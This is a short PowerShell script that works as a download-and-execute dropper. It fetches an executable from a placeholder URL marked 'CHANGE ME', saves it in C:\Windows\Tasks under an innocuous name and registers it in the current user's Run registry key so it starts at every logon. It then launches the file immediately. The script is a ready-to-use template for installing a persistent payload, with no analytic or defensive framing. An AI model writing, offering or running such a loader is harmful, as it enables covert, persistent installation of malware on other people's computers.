$exeUrl = "https://github.com/" # CHANGE ME

$destPath = "C:\Windows\Tasks\gumpbit.exe"

$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($exeUrl, $destPath)

$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$exeName = "Ballsack" # Name the entry
$command = $destPath # Command to run the EXE

Set-ItemProperty -Path $registryPath -Name $exeName -Value $command

$webClient.Dispose()

Start-Process $destPath
